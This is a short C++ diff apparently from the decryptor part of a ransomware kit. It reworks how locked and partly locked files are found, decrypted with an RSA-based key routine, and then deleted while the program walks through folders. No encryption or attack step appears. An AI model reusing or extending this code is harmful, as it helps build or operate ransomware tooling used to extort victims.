@@ -233,12 +233,7 @@ Status decrypt_wrapper(string path, RsaDecryptor& rsaDecryptor)
 	std::ifstream ifile;
 	PBYTE keyIV = nullptr, keyIVBuff = nullptr, iv = nullptr, key = nullptr, cipher = nullptr;
 	Status status = STATUS_SUCCESS;
-	if(string::npos != path.find(PART_LOCKED_EXT))
-	{
-		partialDecrypt(path, rsaDecryptor);
-		return STATUS_SUCCESS;
-	}
-	if (!do_decrypt(path)) return STATUS_UNSUCCESSFUL;
+
 	keyIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ENCRYPTED_KEY_IV_LEN);
 	if (keyIV == nullptr)
 	{
@@ -353,10 +348,18 @@ static void iterate(const path& parent, RsaDecryptor& rsaDecryptor) {
 			iterate(path, rsaDecryptor);
 		}
 		else {
-			if (!do_decrypt(path)) continue;
-			status = decrypt_wrapper(path, rsaDecryptor);
-			if (!NT_SUCCESS(status)) continue;
-			remove(path);
+			if (do_decrypt(path))
+			{
+				status = decrypt_wrapper(path, rsaDecryptor);
+				if (!NT_SUCCESS(status)) continue;
+			}
+			else if (string::npos != path.find(PART_LOCKED_EXT))
+			{
+				partialDecrypt(path, rsaDecryptor);
+			}
+			else continue;
+			boost::system::error_code ec;
+			remove(path,ec);
 		}
 	}
 }
@@ -404,3 +407,4 @@ int decryption_main()
 
 	return 0;
 }
+
